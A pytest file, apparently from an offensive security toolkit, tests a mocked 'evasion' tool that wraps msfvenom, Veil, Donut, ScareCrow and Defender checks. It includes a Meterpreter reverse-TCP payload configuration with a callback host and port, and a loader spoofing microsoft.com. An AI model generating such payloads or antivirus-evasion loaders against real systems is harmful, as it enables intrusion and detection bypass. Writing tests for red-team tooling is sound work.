"""Tests for evasion — mocked subprocess."""
from __future__ import annotations

import json

import pytest
from unittest.mock import patch, AsyncMock

from tools.evasion import EvasionTool


@pytest.fixture
def tool():
    return EvasionTool()


class TestInstantiation:
    def test_has_name(self, tool):
        assert tool.name == "evasion"

    def test_actions_defined(self, tool):
        expected = {
            "msfvenom_generate", "veil_generate", "shellter_inject",
            "donut_generate", "scarecrow_generate", "amsi_test",
            "defender_check", "entropy_analysis",
        }
        assert set(tool.ACTIONS.keys()) == expected


class TestDispatch:
    @pytest.mark.asyncio
    async def test_unknown_action(self, tool):
        result = await tool.execute("nonexistent_action")
        assert "Unknown action" in result


class TestMsfvenom:
    @pytest.mark.asyncio
    @patch("tools.base.asyncio.create_subprocess_exec")
    async def test_msfvenom_generate(self, mock_exec, tool):
        proc = AsyncMock()
        proc.communicate.return_value = (b"Payload size: 354 bytes\nSaved as: /tmp/payload\n", b"")
        proc.returncode = 0
        mock_exec.return_value = proc
        await tool.execute("msfvenom_generate", payload="windows/meterpreter/reverse_tcp", lhost="10.0.0.1", lport=4444)
        cmd = mock_exec.call_args[0]
        assert cmd[0] == "msfvenom"
        assert "LHOST=10.0.0.1" in cmd


class TestVeil:
    @pytest.mark.asyncio
    @patch("tools.base.asyncio.create_subprocess_exec")
    async def test_veil_generate(self, mock_exec, tool):
        proc = AsyncMock()
        proc.communicate.return_value = (b"Payload generated successfully\n", b"")
        proc.returncode = 0
        mock_exec.return_value = proc
        await tool.execute("veil_generate", lhost="10.0.0.1", lport=4444)
        cmd = mock_exec.call_args[0]
        assert cmd[0] == "veil"


class TestDonut:
    @pytest.mark.asyncio
    @patch("tools.base.asyncio.create_subprocess_exec")
    async def test_donut_generate(self, mock_exec, tool):
        proc = AsyncMock()
        proc.communicate.return_value = (b"Shellcode written to /tmp/payload\n", b"")
        proc.returncode = 0
        mock_exec.return_value = proc
        await tool.execute("donut_generate", input_file="/tmp/test.exe", output_path="/tmp/shellcode.bin")
        cmd = mock_exec.call_args[0]
        assert cmd[0] == "donut"
        assert "/tmp/test.exe" in cmd


class TestScareCrow:
    @pytest.mark.asyncio
    @patch("tools.base.asyncio.create_subprocess_exec")
    async def test_scarecrow_generate(self, mock_exec, tool):
        proc = AsyncMock()
        proc.communicate.return_value = (b"Loader generated\n", b"")
        proc.returncode = 0
        mock_exec.return_value = proc
        await tool.execute("scarecrow_generate", input_file="/tmp/sc.bin", domain="microsoft.com")
        cmd = mock_exec.call_args[0]
        assert cmd[0] == "scarecrow"
        assert "microsoft.com" in cmd


class TestDefenderCheck:
    @pytest.mark.asyncio
    @patch("tools.base.asyncio.create_subprocess_exec")
    async def test_defender_check(self, mock_exec, tool):
        proc = AsyncMock()
        proc.communicate.return_value = (b"No threats detected\n", b"")
        proc.returncode = 0
        mock_exec.return_value = proc
        await tool.execute("defender_check", payload_path="/tmp/payload.exe")
        cmd = mock_exec.call_args[0]
        assert cmd[0] == "defender-check"
        assert "/tmp/payload.exe" in cmd


class TestEntropy:
    @pytest.mark.asyncio
    @patch("tools.base.asyncio.create_subprocess_exec")
    async def test_entropy_analysis(self, mock_exec, tool):
        proc = AsyncMock()
        proc.communicate.return_value = (b'{"entropy": 7.2}', b"")
        proc.returncode = 0
        mock_exec.return_value = proc
        await tool.execute("entropy_analysis", payload_path="/tmp/payload.exe")
        cmd = mock_exec.call_args[0]
        assert cmd[0] == "python3"


class TestBinaryNotFound:
    @pytest.mark.asyncio
    @patch("tools.base.asyncio.create_subprocess_exec", side_effect=FileNotFoundError)
    async def test_missing_binary(self, mock_exec, tool):
        result = await tool.execute("msfvenom_generate")
        data = json.loads(result)
        assert "error" in data
        assert "not found" in data["error"]
